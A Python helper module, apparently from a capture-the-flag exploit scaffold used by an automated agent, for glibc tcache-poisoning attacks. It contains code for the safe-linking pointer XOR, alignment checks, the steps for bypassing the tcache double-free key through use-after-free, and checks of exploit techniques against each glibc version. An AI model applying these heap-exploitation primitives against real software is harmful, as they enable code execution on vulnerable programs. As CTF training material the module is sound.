#!/usr/bin/env python3
"""tcache poison helpers — auto-branch on the libc_profile.json feature
flags so the agent doesn't have to remember which glibc has safe-linking
vs which has the tcache `key` field.

Common pitfalls this module sidesteps:
  - Applying the safe-linking XOR on glibc <= 2.31 → fd points to garbage
  - Forgetting the XOR on glibc >= 2.32          → fd points to garbage
  - Double-freeing into tcache on glibc >= 2.35 without bypassing the
    `key` field → process aborts with `free(): double free detected
    in tcache 2`.

Usage from your exploit:

    from scaffold.tcache_poison import safe_link, alignment_ok, key_bypass_needed

    fd = safe_link(target_addr=__free_hook, chunk_addr=heap_a)
    edit(victim_idx, p64(fd))
"""
from __future__ import annotations

import json
from pathlib import Path


_DEFAULT_PROFILE_PATH = Path("./.chal-libs/libc_profile.json")


def load_profile(path: Path | None = None) -> dict | None:
    p = path or _DEFAULT_PROFILE_PATH
    if p.is_file():
        try:
            return json.loads(p.read_text())
        except Exception:
            return None
    return None


def safe_link(target_addr: int, chunk_addr: int,
              *, profile: dict | None = None) -> int:
    """Returns the fd value to write into a freed tcache chunk.

    glibc >= 2.32: fd = target ^ (chunk_addr >> 12)   (safe-linking)
    glibc <= 2.31: fd = target                        (no transform)

    If `profile` is None and libc_profile.json is unavailable, defaults
    to applying the XOR (conservative: assumes modern glibc) and prints
    a warning so the caller can override.
    """
    profile = profile if profile is not None else load_profile()
    if profile is None:
        import sys
        sys.stderr.write(
            "[tcache_poison] no libc_profile.json — assuming safe_linking=True. "
            "Override `profile=` if glibc < 2.32.\n"
        )
        return target_addr ^ (chunk_addr >> 12)
    if profile.get("safe_linking"):
        return target_addr ^ (chunk_addr >> 12)
    return target_addr


def alignment_ok(target_addr: int) -> bool:
    """tcache requires 0x10 alignment of malloc-returned chunks. On glibc
    >= 2.32 a misaligned poisoned chunk aborts with `malloc(): unaligned
    tcache chunk detected`. Call this BEFORE shipping the exploit so the
    crash is loud instead of remote-only.
    """
    return (target_addr & 0xf) == 0


def key_bypass_needed(profile: dict | None = None) -> bool:
    """True on glibc >= 2.35: a `key` field was added to tcache chunks
    so any double-free into tcache aborts unless you first overwrite
    the key (via UAF / largebin overlap / direct edit).

    The standard technique is:
      1. free(victim)                        # key gets set to perthread ptr
      2. edit(victim, p64(0) at offset 0x8)  # zero the key via UAF
      3. free(victim)                        # second free now succeeds
    """
    profile = profile if profile is not None else load_profile()
    return bool(profile and profile.get("tcache_key"))


def assert_techniques_match(profile: dict | None,
                            using: list[str]) -> None:
    """Cross-check a list of technique names against the profile's
    `recommended_techniques` + `blacklisted_techniques`. Raises
    SystemExit(2) on blacklist match so a wrong-version chain fails
    LOUD locally instead of silently on remote.

    `using` examples: ["__free_hook overwrite", "tcache poison",
                       "FSOP _IO_str_jumps __finish"]
    Substring match (case-insensitive) is enough to flag the common
    misapplications (__free_hook on 2.34+, __finish on 2.37+).
    """
    if not profile:
        return
    blacklist = [b.lower() for b in profile.get("blacklisted_techniques") or []]
    for technique in using:
        for blocked in blacklist:
            if technique.lower() in blocked or blocked.split(" ")[0] in technique.lower():
                import sys
                sys.stderr.write(
                    f"[tcache_poison] technique {technique!r} is blacklisted "
                    f"for glibc {profile.get('version')}: {blocked}\n"
                )
                raise SystemExit(2)
